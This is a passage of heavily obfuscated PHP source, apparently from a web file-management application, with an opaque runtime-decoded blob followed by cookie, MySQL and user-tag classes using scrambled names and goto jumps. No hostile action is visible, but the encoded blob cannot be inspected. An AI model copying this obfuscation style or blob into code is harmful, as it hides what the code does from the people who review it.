76\xd7\x89".strrev('âıÒQÈB¨WeDS	åIÕšu·øV)X±¥Ø-Ë%jğE¤B"å…°¦Uæ¨½€KDün'."\r".'')."\x2d\x33\xce\xc7\x91\x49\x22\x89\x66\x2f\x8a\x40\xd\xd2\x2d\xb7\x53\xb7\x80\x1b\x25\x57\x9c\xa0\x65\x23\x22\x25\x93\x52\xcc\x89\x3d\xfa\xc5\x5e\x13\xc2\xc2\xe3\x22\x49\xa6\xf7\x7a\x1\x37\xb3\x27\x95\xea\x76\xf0\xed\x92\x26"."\102\232\140\212\120\345\135\264\270\42\227\110\117\126\14\63\376\202\64\160\305\113\230\125\234\175\332\260\40\235\5\137\225\311\264\153\303\125\262\146\52\70\77\24\303\263\22\322\133\162\167\45\314\243\364\21".base64_decode('uXXIJyyVHBkrY4U7LKm8i2Mmw8Rx1YZP0J6zuOxuiwOViCJ50lxtRxJHYDUnoc9Dh8LFYaJJp3M=')."\x2f\x9e\x8d\xaf\x19\xca\x43\x6c\x28\xbd\x8e\x58\x17\x43\x8d\xe5\x8d\x8c\x92\x74\x25\x81\x2c\x4e\xaa\xbe\xaa\xc8\x4e\x2\x1\x3d\x17\x91\xaa\x93\xd5\x14\xa6\x2c\x90\xa8\xde\x88\x80\x4a\xe7\x14\x4b\xe2\x29\x91\xc0\x48\x17\xd3"."\61\371\222\356\21\37\30\344\214\313\211\216\356\124\1\15\306\134\310\102\336\312\104\63\227\303\327\323\123\44\123\65\151\351\244\255\314\221\343\272\66\264\103\204\51\26\33\207\106\346\211\20\211\246\5\234"."\111\64\277\356\232\67\271\200\173\116\151\11\371\274\163\304\217\30\166\172\100\342\340\53\23\53\343\113\25\313\14\35\250\76\16\167\157\331\52\273\325\226\104\45\25\375\221\164\252\222\146\225\62\264\107\125"."\213\321\44\134\122\60\126\216\262\123\114\1\56\113\223\160\331\212\144\126\270\142\136\111\71\133\53\133\123\14\257\162\362\100\70\231\251\62\140\41\364\223\262\116\65\237\125\63\127\66\7\173\300\235\233\210"."\300\252\367\102\222\21\72\225\137\252\365\242\152\346\51\173\341\316\55\350\40\314\106\127\113\251\272\101\101\253\243\312\211\301\122\252\234\21\24\377\115\251\102\46\64\254\52\17\53\221\126\105\311\13\34\171"."\271\74\204\125\111\226\65\306\252\353\224\305\253\342\67\313\251\367\345\212\167\274\44\100\121\22\43\214\327\313\46\305\134\333\121\324\204\10\306\234\61\44\324\152\231\365\317\14\307\361\126\56\14\25\114\176"."\144\146\204\52\65\357\110\105\5\316\175\120\50\113\17\351\124\265\77\362\140\341\126\245\30\51\307\136\210\220\55\267\50\13\157\332\106\132\322\65\25\326\47\174\144\206\340\151\163\102\362\354\276\37\20\242"."\66\207\276\122\65\141\72\216\242\237\76\341\33\236\326\47\321\150\2\100\34\366\201\224\62\202\73\105\252\226\20\304\72\61\374\72\232\334\16\120\112\202\46\47\314\222\355\241\312\363\105\362\333\152\332\266".base64_decode('0OZhdxWID8DkgEfSY0Nf4h4ad4pcZxIYprcN+BMUJLDkKKHTVIL0HAF8ccoD8cp703b+lMmQmUk=')."\x99\xa3\xcc\x89\x33\x82\x1c\x69\x4e\x24\xb7\x95\xe0\xea\x51\xd2\xb4\x23\x7e\x6a\x2c\x3f\x4d\xf1\xc3\x1b\x8e\x5e\x72\xcf\xe1\x5\xb7\xc2\x83\xc5\x7e\x47\x71\xfa\x88\x36\x57\x8a\xff\xa2\x1a\x40\xc6\x2f\xaa\xa0\xf\xb8\x11\x99"."\56\330\44\46\222\211\212\244\256\100\42\261\72\26\157\243\357\275\125\44\223\122\222\12\143\105\122\127\107\54\72\125\132\250\63\20\216\124\244\141\155\307\250\52\74\201\323\244\160\27\351\45\271\361\237\252".strrev(';©vi8†y{TWÉ¢”âT^>áyé?_(¯s'."\n".'²:Õ0³ÅnwH"ÅÀ7ëvÑJàá')."\365\147\30\344\102\265\130\253\61\12\55\305\213\20\213\37\315\343\10\200\363\23\102\223\306\347\120\342\221\342\311\46\41\130\107\332\273\362\351\116\256\155\271\160\215\44\317\252\72\233\125\356\16\345\13\130".base64_decode('nComB3fzRPYIzqCZkvQXKW8HnglguiU9VvrtSLa1fi9HB5J6CpWBY6QgpNP/B3sQkdzUyAAA').""."", 10, -8))); goto B¡‰·Ô¿; d¸Üµ×©Í´: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ü—Ş¡´« = '', $ÅİŠ‰Ç = 0) { if (is_string($Ü—Ş¡´«) && $Ü—Ş¡´« != $_SERVER[œ—üé‹ê][12]) { $this->prefix = $Ü—Ş¡´«; } if (is_numeric($ÅİŠ‰Ç) && $ÅİŠ‰Ç > 0) { $this->expire = $ÅİŠ‰Ç; } } public static function getInstance() { static $õ…¬Áß; if ($õ…¬Áß === null) { $õ…¬Áß = new self(); } return $õ…¬Áß; } private static $cookieDisable = false; public static function disable($ñ¹ƒ“¼) { self::$cookieDisable = $ñ¹ƒ“¼; } private static $sameCookieSet = array(); public static function set($½Ïş•», $½ã²ÊÖÕ, $ğ§‹˜ôŒ = 0, $¨µ±ˆûÏ = false, $õ›µñü = false) { $®ÚˆÄÃµ =& $_SERVER[œ—üé‹ê]; if (self::$cookieDisable) { return; } if (!$ğ§‹˜ôŒ) { $ğ§‹˜ôŒ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$½Ïş•»]) && self::$sameCookieSet[$½Ïş•»] == $½ã²ÊÖÕ . $ğ§‹˜ôŒ) { return; } self::$sameCookieSet[$½Ïş•»] = $½ã²ÊÖÕ . $ğ§‹˜ôŒ; if (!$õ›µñü) { $õ›µñü = str_replace(HOST, $®ÚˆÄÃµ[12], APP_HOST); $õ›µñü = _get($GLOBALS, $®ÚˆÄÃµ[1047], $õ›µñü); } $ùèü¼İÀ = $®ÚˆÄÃµ[12]; setcookie($½Ïş•», $½ã²ÊÖÕ, time() + $ğ§‹˜ôŒ, $®ÚˆÄÃµ[8] . trim($õ›µñü, $®ÚˆÄÃµ[8]) . $ùèü¼İÀ, !1, !1, $¨µ±ˆûÏ); } public static function setSafe($Ğåİîƒé, $è®¹ô¿å, $’òÊ‚ê§ = 0) { self::set($Ğåİîƒé, $è®¹ô¿å, $’òÊ‚ê§, !0); } public static function get($½öÚİÓÛ) { static $¡ûÚëĞ¿ = false; if (!$¡ûÚëĞ¿) { self::initHeaderCookie(); $¡ûÚëĞ¿ = !0; } return isset($_COOKIE[$½öÚİÓÛ]) ? $_COOKIE[$½öÚİÓÛ] : !1; } private static function initHeaderCookie() { $¡–†ÖÂÍ =& $_SERVER[œ—üé‹ê]; if (!isset($_SERVER[$¡–†ÖÂÍ[1048]]) || !$_SERVER[$¡–†ÖÂÍ[1048]]) { return; } $ÏøÑê‚ = explode($¡–†ÖÂÍ[74], $_SERVER[$¡–†ÖÂÍ[1048]]); foreach ($ÏøÑê‚ as $¶¾¿È©®) { $¶¾¿È©® = explode($¡–†ÖÂÍ[464], $¶¾¿È©®); if (count($¶¾¿È©®) != 2 || !isset($¶¾¿È©®[1])) { continue; } $_COOKIE[trim($¶¾¿È©®[0])] = trim($¶¾¿È©®[1]); } } public static function remove($å‡ñ’ÌÓ, $º“òÌ²ş = false) { unset($_COOKIE[$å‡ñ’ÌÓ]); self::set($å‡ñ’ÌÓ, $_SERVER[œ—üé‹ê][12], 1, $º“òÌ²ş); } } class DbMysql extends Db { public function __construct($Öµú®’— = '') { $©ó›™şş =& $_SERVER[œ—üé‹ê]; if (!extension_loaded($©ó›™şş[910])) { think_exception(think_lang($©ó›™şş[14]) . $©ó›™şş[1049]); } if (!empty($Öµú®’—)) { $this->config = $Öµú®’—; if (empty($this->config[$©ó›™şş[17]])) { $this->config[$©ó›™şş[17]] = $©ó›™şş[12]; } } } public function connect($­ëïÓ  = '', $¦º•ÔĞâ = 0, $ö¬ûøîø = false) { $Êƒšˆ­Í =& $_SERVER[œ—üé‹ê]; if (!isset($this->linkID[$¦º•ÔĞâ])) { if (empty($­ëïÓ )) { $­ëïÓ  = $this->config; } $€î´ûËÀ = $­ëïÓ [$Êƒšˆ­Í[1050]] . ($­ëïÓ [$Êƒšˆ­Í[1051]] ? "\x3a{$­ëïÓ [$Êƒšˆ­Í[1051]]}" : $Êƒšˆ­Í[12]); $ÔÀá³³µ = !empty($­ëïÓ [$Êƒšˆ­Í[17]][$Êƒšˆ­Í[18]]) ? $­ëïÓ [$Êƒšˆ­Í[17]][$Êƒšˆ­Í[18]] : $this->pconnect; if ($ÔÀá³³µ) { $this->linkID[$¦º•ÔĞâ] = mysql_pconnect($€î´ûËÀ, $­ëïÓ [$Êƒšˆ­Í[1052]], $­ëïÓ [$Êƒšˆ­Í[1053]], 131072); } else { $this->linkID[$¦º•ÔĞâ] = mysql_connect($€î´ûËÀ, $­ëïÓ [$Êƒšˆ­Í[1052]], $­ëïÓ [$Êƒšˆ­Í[1053]], !0, 131072); } if (!$this->linkID[$¦º•ÔĞâ] || !empty($­ëïÓ [$Êƒšˆ­Í[21]]) && !mysql_select_db($­ëïÓ [$Êƒšˆ­Í[21]], $this->linkID[$¦º•ÔĞâ])) { think_exception(mysql_error()); } $´€Ê†à• = mysql_get_server_info($this->linkID[$¦º•ÔĞâ]); mysql_query($Êƒšˆ­Í[1054] . think_config($Êƒšˆ­Í[1055]) . $Êƒšˆ­Í[58], $this->linkID[$¦º•ÔĞâ]); if ($´€Ê†à• > $Êƒšˆ­Í[1056]) { mysql_query($Êƒšˆ­Í[1057], $this->linkID[$¦º•ÔĞâ]); } $this->connected = !0; if (1 != think_config($Êƒšˆ­Í[22])) { unset($this->config); } } return $this->linkID[$¦º•ÔĞâ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÃªÛÁóò) { $£á£Çì =& $_SERVER[œ—üé‹ê]; if (0 === stripos($ÃªÛÁóò, $£á£Çì[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÃªÛÁóò; if ($this->queryID) { $this->free(); } think_action_status($£á£Çì[23], 1); think_status($£á£Çì[24]); $this->queryID = mysql_query($ÃªÛÁóò, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($âõşà´ƒ) { $»æ§´ğ =& $_SERVER[œ—üé‹ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $âõşà´ƒ; if ($this->queryID) { $this->free(); } think_action_status($»æ§´ğ[25], 1); think_status($»æ§´ğ[24]); $òÏä“’Í = mysql_query($âõşà´ƒ, $this->_linkID); $this->debug(); if (!1 === $òÏä“’Í) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[œ—üé‹ê][1058], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ËĞ²ûËû = mysql_query($_SERVER[œ—üé‹ê][1059], $this->_linkID); $this->transTimes = 0; if (!$ËĞ²ûËû) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $è¥“¸°Õ = mysql_query($_SERVER[œ—üé‹ê][1060], $this->_linkID); $this->transTimes = 0; if (!$è¥“¸°Õ) { $this->error(); return !1; } } return !0; } private function getAll() { $Âá‹ãÒÔ = array(); if ($this->numRows > 0) { while ($‹ØªË÷ = mysql_fetch_assoc($this->queryID)) { $Âá‹ãÒÔ[] = $‹ØªË÷; } mysql_data_seek($this->queryID, 0); } return $Âá‹ãÒÔ; } public function getFields($¨ú¡¸ç×) { $ÄâÌ™¨ø =& $_SERVER[œ—üé‹ê]; $«±Öƒ»® = $this->query($ÄâÌ™¨ø[1061] . $this->parseKey($¨ú¡¸ç×)); $öŞ·äóÛ = array(); if ($«±Öƒ»®) { foreach ($«±Öƒ»® as $™›ÅÍÓë => $’¥Œ‚ˆÅ) { $öŞ·äóÛ[$’¥Œ‚ˆÅ[$ÄâÌ™¨ø[31]]] = array($ÄâÌ™¨ø[32] => $’¥Œ‚ˆÅ[$ÄâÌ™¨ø[31]], $ÄâÌ™¨ø[33] => $’¥Œ‚ˆÅ[$ÄâÌ™¨ø[34]], $ÄâÌ™¨ø[35] => (bool) (strtoupper($’¥Œ‚ˆÅ[$ÄâÌ™¨ø[36]]) === $ÄâÌ™¨ø[1062]), $ÄâÌ™¨ø[37] => $’¥Œ‚ˆÅ[$ÄâÌ™¨ø[38]], $ÄâÌ™¨ø[39] => strtolower($’¥Œ‚ˆÅ[$ÄâÌ™¨ø[40]]) == $ÄâÌ™¨ø[41], $ÄâÌ™¨ø[42] => strtolower($’¥Œ‚ˆÅ[$ÄâÌ™¨ø[43]]) == $ÄâÌ™¨ø[44]); } } return $öŞ·äóÛ; } public function getTables($ı¾‚Èã = '') { $òğİËıæ =& $_SERVER[œ—üé‹ê]; if (!empty($ı¾‚Èã)) { $ÊŠ°”— = $òğİËıæ[1063] . $ı¾‚Èã . $òğİËıæ[1064]; } else { $ÊŠ°”— = $òğİËıæ[1065]; } $Şë¾î¡› = $this->query($ÊŠ°”—); $Ë¾ÓÙ„Ï = array(); foreach ($Şë¾î¡› as $ì¡öóÆÕ => $ØÉòÆıè) { $Ë¾ÓÙ„Ï[$ì¡öóÆÕ] = current($ØÉòÆıè); } return $Ë¾ÓÙ„Ï; } public function replace($×úïŸ¸, $Æü×ĞĞ¡ = array()) { $„ÕáÔ†ü =& $_SERVER[œ—üé‹ê]; foreach ($×úïŸ¸ as $ğığ€Ä• => $¢ªå©È) { $Ê¥‚Ÿ­ü = $this->parseValue($¢ªå©È); if (is_scalar($Ê¥‚Ÿ­ü)) { $Á¼í÷Â§[] = $Ê¥‚Ÿ­ü; $…û¡º•ê[] = $this->parseKey($ğığ€Ä•); } } $¢†ÀŞ“ = $„ÕáÔ†ü[1066] . $this->parseTable($Æü×ĞĞ¡[$„ÕáÔ†ü[357]]) . $„ÕáÔ†ü[1067] . implode($„ÕáÔ†ü[50], $…û¡º•ê) . $„ÕáÔ†ü[1068] . implode($„ÕáÔ†ü[50], $Á¼í÷Â§) . $„ÕáÔ†ü[1069]; return $this->execute($¢†ÀŞ“); } public function insertAll($§ÑÎü¬Ê, $Ôš¢©ğá = array(), $·ÒÈºÚÛ = false) { $ªß´áã¼ =& $_SERVER[œ—üé‹ê]; if (!is_array($§ÑÎü¬Ê[0])) { return !1; } $½Ò·É¦ = array_keys($§ÑÎü¬Ê[0]); $ÁÖÉÎ­ˆ = array(); foreach ($§ÑÎü¬Ê as $óñˆ¨×) { $›¯±–ı‰ = array(); foreach ($óñˆ¨× as $ƒıå’ìÚ => $éÚ•Â»¢) { $éÚ•Â»¢ = $this->parseValue($éÚ•Â»¢); if (is_scalar($éÚ•Â»¢)) { $›¯±–ı‰[] = $éÚ•Â»¢; } } $ÁÖÉÎ­ˆ[] = $ªß´áã¼[337] . implode($ªß´áã¼[50], $›¯±–ı‰) . $ªß´áã¼[1069]; } array_walk($½Ò·É¦, array($this, $ªß´áã¼[1070])); $ä‡¢˜Øû = $·ÒÈºÚÛ ? $ªß´áã¼[1071] : $ªß´áã¼[1072]; $ä‡¢˜Øû = $ªß´áã¼[1072]; $ïÑÑª = $ä‡¢˜Øû . $ªß´áã¼[1073] . $this->parseTable($Ôš¢©ğá[$ªß´áã¼[357]]) . $ªß´áã¼[1067] . implode($ªß´áã¼[50], $½Ò·É¦) . $ªß´áã¼[1074] . implode($ªß´áã¼[50], $ÁÖÉÎ­ˆ); if ($·ÒÈºÚÛ) { $˜âÙºÍÁ = array(); foreach ($½Ò·É¦ as $ƒıå’ìÚ) { if ($ƒıå’ìÚ == $ªß´áã¼[231] || $ƒıå’ìÚ == $ªß´áã¼[1075]) { continue; } $˜âÙºÍÁ[] = $ƒıå’ìÚ . $ªß´áã¼[1076] . $ƒıå’ìÚ . $ªß´áã¼[1069]; } $ïÑÑª .= $ªß´áã¼[1077] . implode($ªß´áã¼[50], $˜âÙºÍÁ); } return $this->execute($ïÑÑª); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $—“Ù‹çô =& $_SERVER[œ—üé‹ê]; $this->error = mysql_errno() . $—“Ù‹çô[4] . mysql_error($this->_linkID); if ($—“Ù‹çô[12] != $this->queryStr) { $this->error .= LNG($—“Ù‹çô[48]) . $this->queryStr; } think_trace($this->error, $—“Ù‹çô[12], $—“Ù‹çô[49]); return $this->error; } public function escapeString($—·›Çª¨) { if ($this->_linkID) { return mysql_real_escape_string($—·›Çª¨, $this->_linkID); } else { return mysql_escape_string($—·›Çª¨); } } public function parseKey(&$ÄÌÈŒãğ, $Íšİ•Åû = true) { $ÒÕÆÃ–Ğ =& $_SERVER[œ—üé‹ê]; if ($Íšİ•Åû) { $ÄÌÈŒãğ = $this->parseKeyCheck($ÄÌÈŒãğ); } if ($ÄÌÈŒãğ != $ÒÕÆÃ–Ğ[220] && !preg_match($ÒÕÆÃ–Ğ[1078], $ÄÌÈŒãğ)) { $ÄÌÈŒãğ = $ÒÕÆÃ–Ğ[475] . trim($ÄÌÈŒãğ, $ÒÕÆÃ–Ğ[475]) . $ÒÕÆÃ–Ğ[475]; } return $ÄÌÈŒãğ; } } class DbMysqli extends Db { public function __construct($ˆÀ™±‘° = '') { $¹ı½Ö—è =& $_SERVER[œ—üé‹ê]; if (!extension_loaded($¹ı½Ö—è[1079])) { think_exception(think_lang($¹ı½Ö—è[14]) . $¹ı½Ö—è[1080]); } if (!empty($ˆÀ™±‘°)) { $this->config = $ˆÀ™±‘°; if (empty($this->config[$¹ı½Ö—è[17]])) { $this->config[$¹ı½Ö—è[17]] = $¹ı½Ö—è[12]; } } } public function connect($°¤¬Íñù = '', $ïÀ¥› = 0) { $ˆÏç…ğâ =& $_SERVER[œ—üé‹ê]; if (!isset($this->linkID[$ïÀ¥›])) { if (empty($°¤¬Íñù)) { $°¤¬Íñù = $this->config; } $this->linkID[$ïÀ¥›] = new mysqli($°¤¬Íñù[$ˆÏç…ğâ[1050]], $°¤¬Íñù[$ˆÏç…ğâ[1052]], $°¤¬Íñù[$ˆÏç…ğâ[1053]], $°¤¬Íñù[$ˆÏç…ğâ[21]], $°¤¬Íñù[$ˆÏç…ğâ[1051]] ? intval($°¤¬Íñù[$ˆÏç…ğâ[1051]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ë–úğÉ = $this->linkID[$ïÀ¥›]->server_version; $this->linkID[$ïÀ¥›]->query($ˆÏç…ğâ[1054] . think_config($ˆÏç…ğâ[1055]) . $ˆÏç…ğâ[58]); if ($ë–úğÉ > $ˆÏç…ğâ[1056]) { $this->linkID[$ïÀ¥›]->query($ˆÏç…ğâ[1057]); } $this->connected = !0; if (1 != think_config($ˆÏç…ğâ[22])) { unset($this->config); } } return $this->linkID[$ïÀ¥›]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($§“øøÁ) { $„¨É¬” =& $_SERVER[œ—üé‹ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $§“øøÁ; if ($this->queryID) { $this->free(); } think_action_status($„¨É¬”[23], 1); think_status($„¨É¬”[24]); $this->queryID = $this->_linkID->query($§“øøÁ); if ($this->_linkID->more_results()) { while (($î³ˆÏƒÍ = $this->_linkID->next_result()) != NULL) { $î³ˆÏƒÍ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($û˜éÓ²Í) { $˜˜ôÜĞ£ =& $_SERVER[œ—üé‹ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $û˜éÓ²Í; if ($this->queryID) { $this->free(); } think_action_status($˜˜ôÜĞ£[25], 1); think_status($˜˜ôÜĞ£[24]); $ ‰ä¶´… = $this->_linkID->query($û˜éÓ²Í); $this->debug(); if (!1 === $ ‰ä¶´…) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¸„áËÊŸ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¸„áËÊŸ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $µ¢¥ËÕ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$µ¢¥ËÕ) { $this->error(); return !1; } } return !0; } private function getAll() { $‚ÊÉúÜ¨ = array(); if ($this->numRows > 0) { for ($å¬µ”ê£ = 0; $å¬µ”ê£ < $this->numRows; $å¬µ”ê£++) { $‚ÊÉúÜ¨[$å¬µ”ê£] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‚ÊÉúÜ¨; } public function getFields($ ŸàŸ…«) { $şüÏ¼¨Ü =& $_SERVER[œ—üé‹ê]; $¦İ¼Ã÷ = $this->query($şüÏ¼¨Ü[1061] . $this->parseKey($ ŸàŸ…«)); $’”šï§÷ = array(); if ($¦İ¼Ã÷) { foreach ($¦İ¼Ã÷ as $ÔÄô¨¬ => $¤âäË÷) { $’”šï§÷[$¤âäË÷[$şüÏ¼¨Ü[31]]] = array($şüÏ¼¨Ü[32] => $¤âäË÷[$şüÏ¼¨Ü[31]], $şüÏ¼¨Ü[33] => $¤âäË÷[$şüÏ¼¨Ü[34]], $şüÏ¼¨Ü[35] => (bool) ($¤âäË÷[$şüÏ¼¨Ü[36]] === $şüÏ¼¨Ü[12]), $şüÏ¼¨Ü[37] => $¤âäË÷[$şüÏ¼¨Ü[38]], $şüÏ¼¨Ü[39] => strtolower($¤âäË÷[$şüÏ¼¨Ü[40]]) == $şüÏ¼¨Ü[41], $şüÏ¼¨Ü[42] => strtolower($¤âäË÷[$şüÏ¼¨Ü[43]]) == $şüÏ¼¨Ü[44]); } } return $’”šï§÷; } public function getTables($Ü¹È‡å = '') { $ÔÄ¾ñø˜ =& $_SERVER[œ—üé‹ê]; $Ã¦Úç“Î = !empty($Ü¹È‡å) ? $ÔÄ¾ñø˜[1063] . $Ü¹È‡å . $ÔÄ¾ñø˜[1064] : $ÔÄ¾ñø˜[1065]; $±Î…¦® = $this->query($Ã¦Úç“Î); $€¤ˆÏàê = array(); if ($±Î…¦®) { foreach ($±Î…¦® as $—Å¸¸şÕ => $á·±„) { $€¤ˆÏàê[$—Å¸¸şÕ] = current($á·±„); } } return $€¤ˆÏàê; } public function replace($¹Ÿ¡Ì×ü, $ô‰ûì‡¬ = array()) { $ÉÓ‘É¾ =& $_SERVER[œ—üé‹ê]; foreach ($¹Ÿ¡Ì×ü as $´–ëÛ· => $´ê‰ÙÀ‚) { $½Ùœ–‹Ì = $this->parseValue($´ê‰ÙÀ‚); if (is_scalar($½Ùœ–‹Ì)) { $”ñµ¡[] = $½Ùœ–‹Ì; $®¾×–¦Å[] = $this->parseKey($´–ëÛ·); } } $öÄĞš¼Ø = $ÉÓ‘É¾[1066] . $this->parseTable($ô‰ûì‡¬[$ÉÓ‘É¾[357]]) . $ÉÓ‘É¾[1067] . implode($ÉÓ‘É¾[50], $®¾×–¦Å) . $ÉÓ‘É¾[1068] . implode($ÉÓ‘É¾[50], $”ñµ¡) . $ÉÓ‘É¾[1069]; return $this->execute($öÄĞš¼Ø); } public function insertAll($åç‹÷ˆÛ, $—Ğ»Ö„ƒ = array(), $Ôä˜š“ = false) { $°Å™Íú³ =& $_SERVER[œ—üé‹ê]; if (!is_array($åç‹÷ˆÛ[0])) { return !1; } $ƒùû€± = array_keys($åç‹÷ˆÛ[0]); $ÃÁ˜Ğ›á = array(); foreach ($åç‹÷ˆÛ as $©‡Ûá‹Ë) { $†€Ãí°º = array(); foreach ($©‡Ûá‹Ë as $É¼•Ü’î => $¤ÓÏ˜Ø») { $¤ÓÏ˜Ø» = $this->parseValue($¤ÓÏ˜Ø»); if (is_scalar($¤ÓÏ˜Ø»)) { $†€Ãí°º[] = $¤ÓÏ˜Ø»; } } $ÃÁ˜Ğ›á[] = $°Å™Íú³[337] . implode($°Å™Íú³[50], $†€Ãí°º) . $°Å™Íú³[1069]; } array_walk($ƒùû€±, array($this, $°Å™Íú³[1070])); $­Ùûäœ = $Ôä˜š“ ? $°Å™Íú³[1071] : $°Å™Íú³[1072]; $­Ùûäœ = $°Å™Íú³[1072]; $ªÕ®î = $­Ùûäœ . $°Å™Íú³[1073] . $this->parseTable($—Ğ»Ö„ƒ[$°Å™Íú³[357]]) . $°Å™Íú³[1067] . implode($°Å™Íú³[50], $ƒùû€±) . $°Å™Íú³[1074] . implode($°Å™Íú³[50], $ÃÁ˜Ğ›á); if ($Ôä˜š“) { $Ò¼îÓÓÚ = array(); foreach ($ƒùû€± as $É¼•Ü’î) { if ($É¼•Ü’î == $°Å™Íú³[231] || $É¼•Ü’î == $°Å™Íú³[1075]) { continue; } $Ò¼îÓÓÚ[] = $É¼•Ü’î . $°Å™Íú³[1076] . $É¼•Ü’î . $°Å™Íú³[1069]; } $ªÕ®î .= $°Å™Íú³[1077] . implode($°Å™Íú³[50], $Ò¼îÓÓÚ); } return $this->execute($ªÕ®î); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $àüƒ†²€ =& $_SERVER[œ—üé‹ê]; $this->error = $this->_linkID->errno . $àüƒ†²€[4] . $this->_linkID->error; if ($àüƒ†²€[12] != $this->queryStr) { $this->error .= LNG($àüƒ†²€[48]) . $this->queryStr; } think_trace($this->error, $àüƒ†²€[12], $àüƒ†²€[49]); return $this->error; } public function escapeString($¸ÁÁæØñ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¸ÁÁæØñ); } else { return addslashes($¸ÁÁæØñ); } } public function parseKey(&$÷èå¢Ï€, $‹ëÀşÉô = true) { $—íçö•Ã =& $_SERVER[œ—üé‹ê]; if ($‹ëÀşÉô) { $÷èå¢Ï€ = $this->parseKeyCheck($÷èå¢Ï€); } if ($÷èå¢Ï€ != $—íçö•Ã[220] && !preg_match($—íçö•Ã[1078], $÷èå¢Ï€)) { $÷èå¢Ï€ = $—íçö•Ã[475] . trim($÷èå¢Ï€, $—íçö•Ã[475]) . $—íçö•Ã[475]; } return $÷èå¢Ï€; } } goto e—êŠŠ„§ß; eùÁìì„¨: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\164\x61\x67\114\x69\163\164"; public $modelType = "\125\163\145\162\x4f\x70\164\151\157\x6e"; public $field = array("\156\141\x6d\x65", "\163\164\x79\154\145", "\x73\x6f\162\x74"); public function listData($õá¹Œ¹Â = false, $ÇÑ¾— = "\163\x6f\x72\164", $õœÎúôò = false) { return parent::listData($õá¹Œ¹Â, $ÇÑ¾—, $õœÎúôò); } public function remove($‡Õ‡) { return parent::remove($‡Õ‡); } public function add($ƒ¢º¿åı, $ó¹Ïãû = "\x6c\141\142\x65\x6c\55\147\x72\x65\171\55\156\x6f\x72\155\x61\154") { $øíä˜æ =& $_SERVER[œ—üé‹ê]; if ($this->findByName($ƒ¢º¿åı)) { return !1; } $ È‹èÈ› = array($øíä˜æ[509] => $ƒ¢º¿åı, $øíä˜æ[574] => $ó¹Ïãû, $øíä˜æ[2182] => $this->getSort($øíä˜æ[335]) + 1); return parent::insert($ È‹èÈ›); } public function update($Ê‚òÔ‡š, $ÔäŸÖ¹ø) { $¶ùıû˜å =& $_SERVER[œ—üé‹ê]; $·ôò¸ş© = $this->listData($Ê‚òÔ‡š); $Î±òÄˆ› = $this->findByName($ÔäŸÖ¹ø[$¶ùıû˜å[32]]); if (!$·ôò¸ş© || $Î±òÄˆ› && $Î±òÄˆ›[$¶ùıû˜å[487]] != $·ôò¸ş©[$¶ùıû˜å[487]]) { return !1; } return parent::update($Ê‚òÔ‡š, $ÔäŸÖ¹ø); } public function moveTop($÷ÛØéÁĞ) { $ÉÆ­™›Ÿ =& $_SERVER[œ—üé‹ê]; $€á«öŸ‘ = parent::listData(); $ÛÂ·Ç = $this->getSort($ÉÆ­™›Ÿ[334]); foreach ($€á«öŸ‘ as &$×íö·üà) { if ($×íö·üà[$ÉÆ­™›Ÿ[487]] == $÷ÛØéÁĞ) { $×íö·üà[$ÉÆ­™›Ÿ[2200]] = $ÛÂ·Ç; continue; } $×íö·üà[$ÉÆ­™›Ÿ[2200]] += 1; } unset($×íö·üà); return parent::resetData($€á«öŸ‘); } public function moveBottom($½ôí†Ù°) { $…‚æ„» =& $_SERVER[œ—üé‹ê]; $Á›¡¦ğ = $this->getSort($…‚æ„»[335]) + 1; return parent::update($½ôí†Ù°, array($…‚æ„»[2200] => $Á›¡¦ğ)); } public function resetSort($Á¶è¤ÈÓ) { $À¶·†Õ£ =& $_SERVER[œ—üé‹ê]; $Îó¯Ùë = array(); $Á¶è¤ÈÓ = is_array($Á¶è¤ÈÓ) ? $Á¶è¤ÈÓ : array(); for ($›îŞ†Ø† = 0; $›îŞ†Ø† < count($Á¶è¤ÈÓ); $›îŞ†Ø†++) { $Îó¯Ùë[$Á¶è¤ÈÓ[$›îŞ†Ø†] . $À¶·†Õ£[12]] = $›îŞ†Ø† + 1; } $Ü½—¶‘¤ = parent::listData(); foreach ($Ü½—¶‘¤ as &$ôåŸ•‘ı) { $ç¸í“ = $Îó¯Ùë[$ôåŸ•‘ı[$À¶·†Õ£[487]]]; $ôåŸ•‘ı[$À¶·†Õ£[2200]] = $ç¸í“ ? $ç¸í“ : 